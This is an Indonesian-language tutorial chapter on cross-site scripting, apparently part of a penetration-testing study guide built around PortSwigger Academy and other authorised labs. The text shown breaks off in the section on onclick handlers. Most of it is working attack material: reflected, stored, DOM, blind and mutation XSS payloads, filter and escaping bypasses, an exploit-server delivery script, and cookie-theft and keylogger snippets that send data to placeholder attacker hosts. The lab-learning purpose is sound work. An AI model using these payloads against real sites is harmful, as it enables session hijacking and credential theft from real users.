---
id: "20"
title: "🔥 20 — XSS Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "20_xss_workflow.md"
refs_out: ["19","21","22","27"]
refs_in: ["21","27","29","30","31","33"]
---

← [File 19: SQL Injection](/docs/sql-injection)

# 🔥 20 — XSS Workflow

> **Scope:** PortSwigger Academy, HackTheBox, TryHackMe, Proving Grounds, dan lab/target yang memang memberikan izin pengujian. **OS:** Parrot OS XFCE / Debian-based **Primary Tool:** Burp Suite (Proxy, Repeater, Intruder, Collaborator) **Secondary Tool:** Browser DevTools, curl (header/reflection check), python3 http.server **Level:** Beginner → Advanced **Goal:** membangun _muscle memory_ XSS dari detection → context identification → payload construction → validation → impact analysis berbasis alur PortSwigger Academy.

---

# 📚 Daftar Isi

- [⚡ Master XSS Workflow](#-master-xss-workflow)
- [🔥 0. XSS Fundamentals](#-0-xss-fundamentals)
- [🔴 1. Reflected XSS](#-1-reflected-xss)
    - [1.1 Cara Identify Reflected XSS](#11-cara-identify-reflected-xss)
    - [1.2 Basic Payloads Reflected XSS](#12-basic-payloads-reflected-xss)
    - [1.3 Reflected XSS Full Exploitation](#13-reflected-xss-full-exploitation)
- [🟠 2. Stored XSS](#-2-stored-xss)
    - [2.1 Cara Identify Stored XSS](#21-cara-identify-stored-xss)
    - [2.2 Basic Payloads Stored XSS](#22-basic-payloads-stored-xss)
    - [2.3 Stored XSS Full Exploitation](#23-stored-xss-full-exploitation)
- [🟡 3. DOM XSS](#-3-dom-xss)
    - [3.1 Konsep DOM XSS](#31-konsep-dom-xss)
    - [3.2 Common DOM XSS Sources](#32-common-dom-xss-sources)
    - [3.3 Common DOM XSS Sinks](#33-common-dom-xss-sinks)
    - [3.4 DOM XSS Testing](#34-dom-xss-testing)
    - [3.5 Mutation XSS (mXSS)](#35-mutation-xss-mxss)
- [🟢 4. Blind XSS](#-4-blind-xss)
    - [4.1 Konsep Blind XSS](#41-konsep-blind-xss)
    - [4.2 Blind XSS Payload Setup](#42-blind-xss-payload-setup)
    - [4.3 Burp Collaborator untuk Blind XSS](#43-burp-collaborator-untuk-blind-xss)
- [🎯 5. Context-Based Payloads](#-5-context-based-payloads)
    - [5.1 HTML Context](#51-html-context)
    - [5.2 HTML Attribute Context](#52-html-attribute-context)
    - [5.3 HTML href Attribute Context](#53-html-href-attribute-context)
    - [5.4 JavaScript String Context](#54-javascript-string-context)
    - [5.5 JavaScript Template Literal](#55-javascript-template-literal)
    - [5.6 onclick Event Handler Context](#56-onclick-event-handler-context)
    - [5.7 Canonical Link Tag Context](#57-canonical-link-tag-context)
    - [5.8 URL / javascript: Context](#58-url--javascript-context)
    - [5.9 CSS Context](#59-css-context)
    - [5.10 JSON Context](#510-json-context)
    - [5.11 AngularJS Expression (CSTI)](#511-angularjs-expression-csti)
    - [Context Master Table](#context-master-table)
- [🧬 6. Filter Bypass Techniques](#-6-filter-bypass-techniques)
    - [6.1 Tag Fuzzing dengan Burp Intruder](#61-tag-fuzzing-dengan-burp-intruder)
    - [6.2 Attribute Fuzzing dengan Burp Intruder](#62-attribute-fuzzing-dengan-burp-intruder)
    - [6.3 Custom Tag Bypass](#63-custom-tag-bypass)
    - [6.4 SVG Markup Bypass](#64-svg-markup-bypass)
    - [6.5 Keyword Filter Bypass](#65-keyword-filter-bypass)
    - [6.6 Quote Filter Bypass](#66-quote-filter-bypass)
    - [6.7 Space Filter Bypass](#67-space-filter-bypass)
    - [6.8 Bracket Filter Bypass](#68-bracket-filter-bypass)
    - [6.9 WAF Bypass Approach](#69-waf-bypass-approach)
    - [6.10 Polyglot XSS](#610-polyglot-xss)
- [🍪 7. XSS to Cookie Theft](#-7-xss-to-cookie-theft)
    - [7.1 Setup Receiver](#71-setup-receiver)
    - [7.2 XSS Payload Cookie Theft](#72-xss-payload-cookie-theft)
    - [7.3 Apa yang Dilakukan dengan Cookie](#73-apa-yang-dilakukan-dengan-cookie)
- [🔑 8. XSS to Password Capture & CSRF Bypass](#-8-xss-to-password-capture--csrf-bypass)
    - [8.1 XSS to Capture Passwords](#81-xss-to-capture-passwords)
    - [8.2 XSS to Bypass CSRF Defenses](#82-xss-to-bypass-csrf-defenses)
    - [8.3 HttpOnly Cookie — Batas dan Alternatif](#83-httponly-cookie--batas-dan-alternatif)
- [🛡️ 9. CSP Bypass](#️-9-csp-bypass)
    - [9.1 Apa Itu CSP](#91-apa-itu-csp)
    - [9.2 Cara Detect CSP](#92-cara-detect-csp)
    - [9.3 Common CSP Misconfigurations](#93-common-csp-misconfigurations)
    - [9.4 CSP Bypass Techniques](#94-csp-bypass-techniques)
    - [9.5 AngularJS Sandbox Escape](#95-angularjs-sandbox-escape)
    - [9.6 Event Handlers & href Attributes Blocked](#96-event-handlers--href-attributes-blocked)
    - [9.7 JavaScript URL dengan Karakter yang Diblok](#97-javascript-url-dengan-karakter-yang-diblok)
    - [9.8 Dangling Markup Attack](#98-dangling-markup-attack)
    - [9.9 CSP Bypass via Header Injection](#99-csp-bypass-via-header-injection)
- [🧰 10. Tools & Automation](#-10-tools--automation)
    - [10.1 Burp Suite (PRIMARY)](#101-burp-suite-untuk-xss-primary)
    - [10.2 Browser DevTools](#102-browser-devtools-untuk-xss)
    - [10.3 Dalfox](#103-dalfox--xss-scanner)
    - [10.4 XSStrike](#104-xsstrike)
    - [10.5 curl — Simple Output Check](#105-curl--simple-output-check)
- [⚙️ 11. Automation Scripts](#️-11-automation-scripts)
    - [11.1 xss_detect.sh](#111-script-xss_detectsh)
    - [11.2 cookie_stealer_server.py](#112-script-cookie_stealer_serverpy)
    - [11.3 XSS Payload Wordlist Generator](#113-xss-payload-wordlist-generator)
- [🌳 12. Master Decision Tree](#-12-master-decision-tree)
- [📋 13. PortSwigger Lab Quick Reference](#-13-portswigger-lab-quick-reference)
- [🛠️ 14. Common Errors & Troubleshooting](#️-14-common-errors--troubleshooting)
- [✅ 15. Final XSS Checklist](#-15-final-xss-checklist)
- [⚡ 16. Quick Reference](#-16-quick-reference)

---

# ⚡ Master XSS Workflow

```text
INPUT FOUND
↓
REFLECTION / STORAGE / DOM BEHAVIOR
↓
LOCATE EXACT SINK
↓
IDENTIFY CONTEXT  →  → Context determines payload, not the other way around
↓
IDENTIFY TRANSFORMATION (encoding? escape? sanitize?)
↓
SELECT CONTEXT-APPROPRIATE TEST (lihat Section 5)
↓
VALIDATE EXECUTION (di browser, bukan curl)
↓
CLASSIFY XSS (Reflected / Stored / DOM)
↓
ASSESS IMPACT (cookie? CSRF? credential capture?)
↓
DECIDE NEXT ACTION
```

**Payload tidak execute?** Jangan langsung ganti payload — diagnosa dulu:

```text
Payload gagal
↓
Apakah payload direfleksikan? → Tidak → cek Stored / DOM path
↓
Apakah karakter di-encode? → Ya → identifikasi encoding schema
↓
Apakah tag di-strip? → Ya → filter bypass (Section 6)
↓
Apakah context dibaca dengan benar? → Tidak → ulangi Section 5
↓
Apakah sink executable? → Tidak → cek DOM XSS (Section 3)
↓
Apakah CSP/filter/sanitizer berpengaruh? → Ya → Section 6 / Section 9
↓
Baru pilih langkah berikutnya
```

> **Navigation:** Section 12 adalah MASTER DECISION TREE untuk semua path. Section 16 adalah Quick Reference untuk testing cepat. Section 5 adalah sumber utama untuk payload.

---

# 🔥 0. XSS Fundamentals

## Apa Itu XSS?

**Cross-Site Scripting (XSS)** terjadi ketika input yang dikontrol attacker akhirnya diperlakukan browser sebagai executable content — biasanya JavaScript.

```text
Normal:

User Input → "hello" → HTML/Text → Browser tampilkan teks


XSS:

User Input
   │
   ▼
<script>...</script>
   │
   ▼
App memasukkan input tanpa encoding benar
   │
   ▼
Browser parsing sebagai code
   │
   ▼
JavaScript execute
```

Inti XSS:

```text
UNTRUSTED INPUT
      +
UNSAFE HTML/JS SINK
      +
BROWSER INTERPRETATION
      =
XSS
```

> **Reflection ≠ Execution.** Input yang muncul kembali di response bukan berarti XSS. Harus ada context break yang memungkinkan browser mengeksekusi sebagai code. Jangan tulis finding "XSS" hanya karena input di-reflect.

---

## Kenapa XSS Berbahaya?

XSS bukan sekadar `alert(1)`. Impact bergantung pada context dan privilege victim:

```text
XSS
 │
 ├── Read accessible page data
 ├── Perform actions as victim (CSRF via XSS)
 ├── Modify visible page (defacement)
 ├── Phishing / UI redressing
 ├── Capture keystrokes
 ├── Read non-HttpOnly cookies
 ├── Send authenticated requests
 └── Potential session compromise
```

---

## Reflected vs Stored vs DOM XSS

```text
                 XSS
                  │
       ┌──────────┼───────────┐
       ▼          ▼           ▼
  Reflected     Stored       DOM
       │          │            │
       ▼          ▼            ▼
  Request      Input stored   Source
     │          in server      │
     ▼              │           ▼
  Response         ▼         JavaScript
     │          Later page      │
     ▼          rendered        ▼
  Browser           │          Sink
  executes          ▼           │
                 Browser        ▼
                 executes    DOM updated
```

---

## Browser Security Model — Same-Origin Policy

XSS berbahaya karena script berjalan dalam origin aplikasi yang dipercaya:

```text
Victim Browser
      │
      ▼
https://target.example.com
      │
      ▼
Injected JavaScript
      │
      ▼
Runs under target.example.com origin
      │
      ▼
Akses cookie, DOM, localStorage, API calls — semuanya dalam context target
```

---

## Execution Context — Di mana Input Masuk?

| Context                  | Contoh HTML               | Teknik Break              |
| ------------------------ | ------------------------- | ------------------------- |
| HTML body                | `<div>INPUT</div>`        | Inject tag baru           |
| HTML attribute           | `<input value="INPUT">`   | Break dengan `"` atau `'` |
| JS string (single quote) | `var x = 'INPUT';`        | Break dengan `'`          |
| JS string (double quote) | `var x = "INPUT";`        | Break dengan `"`          |
| JS template literal      | ``var x = `INPUT`;``      | Inject `${}`              |
| URL / href               | `<a href="INPUT">`        | `javascript:` scheme      |
| onclick handler          | `onclick="goto('INPUT')"` | HTML entity `&apos;`      |
| CSS                      | `color: INPUT`            | Context-dependent         |
| JSON                     | `{"x":"INPUT"}`           | Trace ke sink             |

> Payload detail per-context ada di **Section 5**.

---

# 🔴 1. Reflected XSS

# 1.1 Cara Identify Reflected XSS

## 📌 Kapan Digunakan

Gunakan saat input dari request muncul kembali di response tanpa disimpan secara persistent.

Lokasi umum:

```text
Search field
Error message
URL parameter
Form input
Redirect parameter
Filter / category parameter
```

---

## Setup Burp Suite

```text
1. Buka Burp Suite
2. Proxy → Open Browser
3. Pastikan "Intercept is off" dulu untuk browsing normal
4. Navigate ke target
5. Perform action (isi form, search, dll)
6. Proxy → HTTP History → temukan request
7. Right-click → Send to Repeater
8. Sekarang test dari Repeater
```

---

## Test Reflection — Burp Suite Repeater

Kirim marker dulu sebelum payload:

```text
Langkah 1:
Di Repeater, ubah parameter jadi marker unik
GET /search?q=xss1234 HTTP/2

Langkah 2:
Klik Send

Langkah 3:
Di tab Response, cari "xss1234"
Gunakan Ctrl+F di panel response
```

Kalau marker muncul di response:

```text
<div class="result">xss1234</div>
```

→ Input direfleksikan. Lanjut identifikasi context.

---

## Identifikasi Context dari Response

Di Burp Repeater, tab **Response**, lihat di mana persis marker muncul:

**HTML Body Context:**

```html
<div class="result">xss1234</div>
```

**Attribute Context:**

```html
<input type="text" value="xss1234">
```

**JavaScript String Context:**

```html
<script>
var searchTerm = 'xss1234';
</script>
```

**Href Context:**

```html
<a href="/search?q=xss1234">Back</a>
```

Kalau mau lihat render: klik tab **Render** di Repeater untuk preview visual.

→ Untuk payload spesifik per-context, lihat **Section 5**.

---

## Reflection ≠ XSS

Kalau source tampak:

```html
<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

Artinya:

```text
✅ reflected
❌ executable (HTML-encoded)
```

Bandingkan kalau unencoded:

```html
<div><script>alert(1)</script></div>
```

```text
✅ reflected
✅ executable candidate
```

---

# 1.2 Basic Payloads Reflected XSS

## 📌 Kapan Digunakan

Setelah reflection ditemukan dan context sudah dipahami. Test dari Burp Repeater, verifikasi eksekusi di browser.

### HTML Body Context — Nothing Encoded

**PortSwigger Lab: Reflected XSS into HTML context with nothing encoded**

```html
<script>alert(1)</script>
```

Di Burp Repeater:

```text
GET /search?q=<script>alert(1)</script> HTTP/2

Response akan contain:
<div class="result"><script>alert(1)</script></div>
```

Copy URL dari Repeater → buka di browser → alert muncul.

---

### Event Handler (saat `<script>` diblok)

```html
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
```

---

## Cara Verifikasi Eksekusi di Browser

Dari Burp Repeater:

```text
Method 1:
Right-click request → Copy URL → paste di browser

Method 2:
Burp Repeater → kanan atas → "Show response in browser"
→ Copy URL → paste di browser

Method 3 (DOM XSS):
Langsung test di URL bar browser karena DOM XSS tidak butuh server round-trip
```

---

# 1.3 Reflected XSS Full Exploitation

## 📌 Kapan Digunakan

Setelah XSS confirmed, lab victim tersedia, dan perlu membuktikan impact.

```text
Attacker craft URL
    │
    ▼
Victim Browser
    │
    ▼
Target Page
    │
    ▼
Reflected Input
    │
    ▼
JavaScript Execute
    │
    ▼
Callback / Action
```

---

## Deliver ke Victim di Lab

Di PortSwigger labs, ada tombol "Go to exploit server" atau "Deliver exploit to victim".

```text
1. Craft payload URL:
   https://TARGET/search?q=<script>alert(1)</script>

2. URL-encode payload karena akan di-embed di HTML:
   https://TARGET/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

3. Di exploit server:
   <script>document.location='https://TARGET/search?q=<script>alert(1)<\/script>'</script>

4. Store → Deliver to victim
```

---

## Cookie Theft Flow

```html
<script>
fetch('https://EXPLOIT-SERVER/log?cookie='+encodeURIComponent(document.cookie))
</script>
```

Atau pakai Burp Collaborator (lihat Section 7).

---

# 🟠 2. Stored XSS

# 2.1 Cara Identify Stored XSS

## 📌 Kapan Digunakan

Saat input dapat disimpan dan muncul kembali ketika halaman dibuka kemudian, bisa oleh user yang sama atau user lain.

Lokasi umum:

```text
Comment / forum post
Profile / bio / username
Product review
Support ticket
Guestbook
Filename pada upload
HTTP headers yang di-log (User-Agent, Referer)
```

---

## Test dengan Marker — Burp Suite

Di Burp Proxy (Intercept) atau Repeater:

```text
Langkah 1:
Intercept request saat submit comment/profile
POST /comment HTTP/2

name=xss1234&comment=xss1234test&postId=1

Langkah 2:
Kirim. Kemudian navigate ke halaman yang menampilkan data tersebut.

Langkah 3:
Cari marker di response halaman:
<p>xss1234test</p>  ← stored dan di-render

Langkah 4:
Cek apakah juga muncul di halaman lain / user lain
```

---

## Confirm Stored XSS

**PortSwigger Lab: Stored XSS into HTML context with nothing encoded**

```text
1. Open Burp, intercept POST request saat kirim comment
2. Ubah field comment jadi:
   <script>alert(1)</script>

3. Forward request
4. Navigate ke halaman yang menampilkan comment
5. Alert muncul → Stored XSS confirmed
```

---

# 2.2 Basic Payloads Stored XSS

## 📌 Kapan Digunakan

Setelah persistent reflection dikonfirmasi.

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

---

## Cookie PoC

```html
<script>
fetch('https://EXPLOIT-SERVER/log?cookie='+encodeURIComponent(document.cookie))
</script>
```

Atau pakai Burp Collaborator URL.

---

## Keylogger — Konsep Lab

```html
<script>
document.addEventListener('keydown', function(e) {
    fetch('https://EXPLOIT-SERVER/log?key='+encodeURIComponent(e.key));
});
</script>
```

Berguna untuk password capture lab (lihat Section 8.1).

---

# 2.3 Stored XSS Full Exploitation

## 📌 Kapan Digunakan

Ketika stored payload diproses oleh user/admin lain (Blind Stored XSS).

```text
Attacker
   │
   ▼
Comment / Ticket / Profile
   │
   ▼
Stored in DB
   │
   ▼
Admin opens page
   │
   ▼
Browser executes
   │
   ▼
Callback receiver
```

---

## Burp Repeater — Test Stored Payload

```text
1. Proxy → HTTP History → cari POST request (comment/profile)
2. Send to Repeater
3. Ubah body:
   comment=<script>alert(1)</script>
4. Send
5. Buka halaman yang menampilkan comment di browser
6. Alert muncul = Stored XSS confirmed
```

---

## Receiver Setup

Untuk PortSwigger labs → pakai **Exploit Server** yang sudah disediakan atau **Burp Collaborator** (lihat Section 4.3).

Untuk local lab / fallback:

```bash
python3 -m http.server 8000
```

Payload:

```html
<script>
fetch('http://ATTACKER-IP:8000/?event=stored-xss')
</script>
```

---

# 🟡 3. DOM XSS

# 3.1 Konsep DOM XSS

## 📌 Kapan Digunakan

Saat input berasal dari client-side source (URL, hash, window.name) dan diproses JavaScript menuju dangerous sink.

DOM XSS tidak bisa di-test dengan curl. Harus di browser.

---

## Source → Sink

```text
SOURCE
   │
   ▼
location.search  (URL parameter)
location.hash    (URL fragment #...)
document.URL     (full URL)
document.referrer
window.name
   │
   ▼
JavaScript processing
   │
   ▼
SINK (dangerous)
   │
   ▼
innerHTML / document.write / eval / setTimeout / jQuery / href
```

---

# 3.2 Common DOM XSS Sources

|Source|Contoh|
|---|---|
|`document.URL`|full URL|
|`document.location`|location object|
|`document.referrer`|previous page|
|`window.name`|cross-navigation value|
|`location.hash`|`#payload` (tidak dikirim ke server)|
|`location.search`|`?q=payload`|

---

# 3.3 Common DOM XSS Sinks

|Sink|Risiko|Payload Type|
|---|---|---|
|`innerHTML`|HTML parsing|`<img src=1 onerror=alert(1)>`|
|`outerHTML`|HTML replacement|sama seperti innerHTML|
|`document.write()`|HTML injection|`<script>alert(1)</script>` atau close existing tag|
|`eval()`|JS execution|`alert(1)`|
|`setTimeout(string)`|string execution|`alert(1)`|
|`setInterval(string)`|string execution|`alert(1)`|
|`jQuery()`|HTML/selector injection|`<img src=1 onerror=alert(1)>`|
|`href` assignment|URL execution|`javascript:alert(1)`|
|`location`|redirect|`javascript:alert(1)`|

---

## innerHTML — Penting!

`innerHTML` **tidak mengeksekusi** `<script>`:

```html
element.innerHTML = '<script>alert(1)</script>';
// TIDAK execute
```

Gunakan event handler sebagai gantinya:

```html
element.innerHTML = '<img src=1 onerror=alert(1)>';
// EXECUTE ✅
```

---

# 3.4 DOM XSS Testing

## 📌 Kapan Digunakan

Saat ada indikasi client-side JS memproses URL/hash ke dangerous sink.

---

## Langkah 1: Audit JS di DevTools

```text
F12 → Sources → Ctrl+Shift+F (global search)

Cari:
- innerHTML
- outerHTML
- document.write
- eval(
- setTimeout(
- setInterval(
- location.hash
- location.search
- document.URL
- $(location
- $("
- jQuery(
```

---

## Langkah 2: Trace Source → Sink

Contoh JS yang vulnerable:

```javascript
// Source: location.search
var q = new URLSearchParams(location.search).get("q");

// Sink: innerHTML
document.getElementById("result").innerHTML = q;
```

Trace:

```text
location.search
      │
      ▼
URLSearchParams
      │
      ▼
q
      │
      ▼
innerHTML ← SINK
      │
      ▼
DOM XSS
```

---

## Langkah 3: Test Payload di Browser

**PortSwigger Lab: DOM XSS in innerHTML sink using source location.search**

Di URL bar browser langsung:

```text
https://TARGET/search?q=<img src=1 onerror=alert(1)>
```

Kenapa `<img>` bukan `<script>`? Karena sink-nya `innerHTML` — `<script>` tidak dieksekusi via innerHTML.

---

## PortSwigger Lab: DOM XSS in document.write sink using source location.search

Source code JS:

```javascript
document.write('<img src="/images/tracker.gif?searchTerms='+query+'">');
```

Input `xss1234` menghasilkan:

```html
<img src="/images/tracker.gif?searchTerms=xss1234">
```

Untuk break out dari atribut `src`:

```text
URL: https://TARGET/search?q="><svg onload=alert(1)>
```

---

## PortSwigger Lab: DOM XSS in document.write sink inside a select element

Source code JS:

```javascript
document.write('<select><option>'+storeId+'</option></select>');
```

```text
URL: https://TARGET/product?productId=1&storeId=</select><img src=1 onerror=alert(1)>
```

---

## PortSwigger Lab: DOM XSS in jQuery anchor href using location.search

```javascript
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
```

```text
URL: https://TARGET/?returnPath=javascript:alert(1)
```

Klik link "Back" → alert execute.

---

## PortSwigger Lab: DOM XSS in jQuery selector sink using hashchange event

```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    post.get(0).scrollIntoView();
});
```

Payload via iframe (karena hash tidak dikirim ke server):

```html
<!-- Di exploit server -->
<iframe src="https://TARGET/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
```

---

## PortSwigger Lab: Reflected DOM XSS

Server menempatkan search term dalam JSON response yang langsung di-eval client-side:

```javascript
eval('var searchResults = ' + responseText);
```

Input masuk ke JSON string, server meng-escape `"` tapi tidak `\`:

```text
Input: \"-alert(1)}//

Hasil JSON:
{"results":[], "searchTerm":"\\"-alert(1)}//"}
```

Dalam eval: `\\` = literal `\`, `"` menutup string, lalu `}//` menutup object dan comment.

---

## PortSwigger Lab: Stored DOM XSS

innerHTML digunakan untuk render comment. Ada partial sanitization yang memblok `<>` di awal tapi bisa di-bypass:

```html
<><img src=1 onerror=alert(1)>
```

`<>` kosong di awal "menghabiskan" sanitization, `<img>` berikutnya lolos.

---

## PortSwigger Lab: DOM XSS in AngularJS expression

Halaman menggunakan AngularJS (`ng-app`). Angle brackets dan double quotes HTML-encoded. Tapi AngularJS eval `{{ }}` expression:

```text
URL: https://TARGET/search?q={{$on.constructor('alert(1)')()}}
```

Lihat Section 5.11 untuk detail CSTI.

---

# 3.5 Mutation XSS (mXSS)

## 📌 Kapan Digunakan

Ketika aplikasi menerapkan HTML sanitizer (DOMPurify versi lama, whitelist regex) sebelum dimasukkan ke `innerHTML`. Sanitizer merasa "aman" tapi browser parser me-mutate DOM sehingga payload execute.

---

## Mekanisme mXSS

```text
1. Sanitization Pass
   Input string → Sanitizer memeriksa → "dianggap aman" (tag/atribut tampak valid)
         │
         ▼
2. DOM Re-parsing via innerHTML
   Browser parser melakukan normalisasi/mutasi DOM
   (pada <noscript>, MathML, SVG, atau atribut belum tertutup)
         │
         ▼
3. Execution
   Mutasi mengubah struktur DOM → string yang semula di atribut/tag pasif
   melompat keluar → menjadi tag/event handler executable
```

---

## Contoh 1: Tag Breakout via Atribut Tidak Tertutup

```html
<p id="</p><img src=x onerror=alert(1)>">
```

- **Saat sanitasi:** Sanitizer menganggap seluruh teks setelah `id="` adalah nilai atribut string biasa → aman
- **Saat browser rendering via innerHTML:** Parser menutup tag `<p>` terlebih dahulu, lalu me-render `<img>` sebagai elemen baru → `onerror` execute

## Contoh 2: Namespace Confusion (MathML / SVG)

```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
```

Parser berpindah dari XML/MathML namespace kembali ke HTML namespace, memicu rekonstruksi pohon DOM yang mengeksekusi payload.

---

# 🟢 4. Blind XSS

# 4.1 Konsep Blind XSS

## 📌 Kapan Digunakan

Saat payload disimpan dan diproses oleh halaman yang tidak bisa dilihat langsung (admin panel, internal dashboard, log viewer, support ticket viewer).

```text
Support Ticket
     │
     ▼
Attacker submits payload
     │
     ▼
Stored in DB
     │
     ▼
Admin panel
     │
     ▼
Admin opens ticket
     │
     ▼
XSS executes di browser admin
     │
     ▼
Callback ke attacker
     (cookie admin / screenshot / etc)
```

---

# 4.2 Blind XSS Payload Setup

Karena tidak ada alert visible, butuh callback ke server eksternal.

Payload minimal (konfirmasi eksekusi):

```html
<script>
fetch('https://ATTACKER/?blind=1')
</script>
```

Cookie callback:

```html
<script>
fetch('https://ATTACKER/?c='+encodeURIComponent(document.cookie))
</script>
```

---

# 4.3 Burp Collaborator untuk Blind XSS

Burp Collaborator lebih reliable daripada python server untuk lab.

```text
1. Burp → Burp Collaborator (di menu atas)
2. Klik "Copy to clipboard"
   → Dapat URL seperti: abc123def456.oastify.com

3. Buat payload:
   <script>
   fetch('https://abc123def456.oastify.com/?c='+encodeURIComponent(document.cookie))
   </script>

4. Submit ke form yang akan dilihat admin

5. Kembali ke Burp Collaborator
6. Klik "Poll now"
7. Lihat interaction yang masuk:
   GET /?c=session=admin-cookie HTTP/1.1
   Host: abc123def456.oastify.com
```

---

## Fallback: python3 http.server

Untuk kasus di mana callback butuh local server (lab environment):

```bash
python3 -m http.server 8000
```

Payload:

```html
<script>
fetch('http://ATTACKER-IP:8000/?c='+encodeURIComponent(document.cookie))
</script>
```

> Catatan: untuk PortSwigger labs, pakai exploit server atau Collaborator — python server tidak reachable dari cloud labs.

---

# 🎯 5. Context-Based Payloads

> **Prinsip utama:** Context determines payload, bukan sebaliknya. Jangan pilih payload berdasarkan "payload apa yang paling kuat", tapi berdasarkan **context tempat input dimasukkan** dan **encoding yang diterapkan**.

---

# 5.1 HTML Context

## 📌 Kapan Digunakan

Input berada langsung di HTML body, di antara tags, tanpa encoding:

```html
<div class="result">INPUT</div>
```

---

## Test

Kirim marker dulu di Burp Repeater:

```text
q=xss1234

Response: <div class="result">xss1234</div>
```

Kalau marker muncul sebagai text biasa → HTML Body Context.

---

## Payload

**PortSwigger Lab: Reflected XSS into HTML context with nothing encoded**

```html
<script>alert(1)</script>
```

**PortSwigger Lab: Stored XSS into HTML context with nothing encoded**

```html
<script>alert(1)</script>
```

Alternatif kalau `<script>` diblok:

```html
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
```

---

# 5.2 HTML Attribute Context

## 📌 Kapan Digunakan

Input berada di dalam nilai atribut HTML:

```html
<input type="text" value="INPUT">
```

Angle brackets HTML-encoded. Tapi `"` (quote yang menutup atribut) bisa dieksploitasi.

---

## PortSwigger Lab: Reflected XSS into attribute with angle brackets HTML-encoded

Marker response:

```html
<input type="text" value="xss1234">
```

`<script>` tidak akan jalan karena angle brackets di-encode. Tapi `"` tidak di-encode:

```text
Payload: " onmouseover="alert(1)

Hasil:
<input type="text" value="" onmouseover="alert(1)">
```

Hover mouse di atas input → alert execute.

Alternatif yang auto-trigger:

```text
" autofocus onfocus="alert(1)

Hasil:
<input type="text" value="" autofocus onfocus="alert(1)">
```

Auto-trigger saat page load (element autofocus).

---

# 5.3 HTML href Attribute Context

## 📌 Kapan Digunakan

Input berada di dalam atribut `href`. Double quotes mungkin HTML-encoded tapi nilai href bisa berisi `javascript:` scheme.

---

## PortSwigger Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

Input tersimpan dan muncul sebagai URL di anchor:

```html
<a href="INPUT">Website</a>
```

Double quotes HTML-encoded, tapi `javascript:` scheme tidak diblok:

```text
Payload: javascript:alert(1)

Hasil:
<a href="javascript:alert(1)">Website</a>
```

Klik link → alert execute.

---

# 5.4 JavaScript String Context

## 📌 Kapan Digunakan

Input berada di dalam JavaScript string di antara `<script>` tags:

```html
<script>
var x = 'INPUT';
</script>
```

Setiap sub-scenario punya encoding yang berbeda. Analisis encoding dulu sebelum memilih payload.

---

## 5.4a JS String — Angle Brackets HTML Encoded

**PortSwigger Lab: Reflected XSS into JS string with angle brackets HTML encoded**

Context:

```javascript
var searchTerms = 'INPUT';
```

`<>` di-encode → tidak bisa `</script>`. Tapi `'` tidak di-escape.

```text
Payload: '-alert(1)-'

Hasil:
var searchTerms = ''-alert(1)-'';
```

`'` menutup string, `-alert(1)-` adalah JS expression (unary minus), `'` membuka string baru. Semua valid JS.

Alternatif:

```text
';alert(1)//

Hasil:
var searchTerms = '';alert(1)//'';
```

---

## 5.4b JS String — Single Quote dan Backslash Escaped

**PortSwigger Lab: Reflected XSS into JS string with single quote and backslash escaped**

Encoding yang diterapkan:

- `'` → `\'`
- `\` → `\\`

Karena `'` dan `\` keduanya di-escape, tidak bisa break JS string. Tapi `<>` **tidak** di-encode. Jadi bisa break keluar dari `<script>` tag:

```text
Payload: </script><script>alert(1)</script>

Hasil:
<script>
var searchTerms = '</script>
<script>alert(1)</script>';
</script>
```

Browser menutup `<script>` pertama di `</script>`, kemudian mengeksekusi `<script>alert(1)</script>` yang baru.

---

## 5.4c JS String — Angle Brackets & Double Quotes HTML Encoded, Single Quotes Escaped (Backslash Tidak Di-escape)

**PortSwigger Lab: Reflected XSS into JS string with angle brackets and double quotes HTML-encoded and single quotes escaped**

Encoding yang diterapkan:

- `<>` → `&lt;` `&gt;` (HTML encoded)
- `"` → `&quot;`
- `'` → `\'` (escaped dengan backslash)
- `\` → **TIDAK di-escape** ← inilah celahnya

```text
Payload: \'-alert(1)//

Proses server-side:
- \ → \ (tidak diubah)
- ' → \'

Output di HTML:
var searchTerms = '\\'-alert(1)//';

Interpretasi JS:
- \\ = escaped backslash = literal karakter \
- '  = MENUTUP STRING (bukan bagian dari escape lagi)
- -alert(1) = JS expression
- // = comment
```

Alert execute! ✅

---

## 5.4d JS String dengan Encoding Lain

|Encoding yang diterapkan|Teknik|
|---|---|
|Hanya angle brackets HTML-encoded|`'-alert(1)-'` atau `';alert(1)//`|
|Single quotes escaped, backslash escaped|`</script>` breakout (5.4b)|
|Single quotes escaped, backslash tidak di-escape|`\'-alert(1)//` (5.4c)|
|Semua di-HTML-encode|Cek context lain (attribute, template literal)|

---

# 5.5 JavaScript Template Literal

## 📌 Kapan Digunakan

Input berada di dalam JavaScript template literal (backtick string):

```javascript
var msg = `Welcome, INPUT!`;
```

---

## PortSwigger Lab: Reflected XSS into template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

Semua karakter escape diblok. Tapi template literal punya `${}` yang mengeksekusi JS:

```text
Payload: ${alert(1)}

Context:
var msg = `Welcome, ${alert(1)}!`;
```

`${}` dieksekusi sebagai JavaScript expression → alert(1) jalan.

---

# 5.6 onclick Event Handler Context

## 📌 Kapan Digunakan

Input tersimpan dan muncul di dalam event handler onclick di HTML:

```html
<a href="..." onclick="var tracker={track(){}};tracker.track('INPUT');"></a>
```

---

## PortSwigger Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Encoding yang diterapkan:

- `<>` → HTML encoded
- `"` → HTML encoded
- `'` → `\'`
- `\` → `\\`

Semua cara escape JS string biasa tidak bisa! Tapi ini **HTML attribute** — HTML entities di-decode browser **sebelum** JavaScript dijalankan.

